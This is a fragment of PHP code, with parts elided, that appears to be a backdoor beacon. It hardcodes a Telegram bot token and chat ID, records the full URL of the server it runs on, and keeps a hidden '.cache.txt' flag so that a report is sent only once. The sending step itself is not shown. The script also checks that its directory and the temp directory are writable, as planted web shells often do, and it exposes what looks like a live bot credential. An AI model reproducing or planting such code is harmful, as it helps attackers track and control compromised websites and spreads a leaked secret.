...
$botToken = '7445452281:AAGOC1mjPtkecz8Bh3c1ydHcFGPmcNAoEBI';
$chatId = '6488596550';

$domain = $_SERVER['SERVER_NAME'];
$requestUri = $_SERVER['REQUEST_URI'];
$fullUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://{$domain}{$requestUri}";

$flag_file = __DIR__ . "/.cache.txt";
...
if (!file_exists($flag_file)) {
    ...
    file_put_contents($flag_file, 'sent');
}

$required_paths = [__DIR__, sys_get_temp_dir()];
foreach ($required_paths as $path_check) {
    if (!is_writable($path_check)) {
        die("Directory not writable: {$path_check}");
    }
}
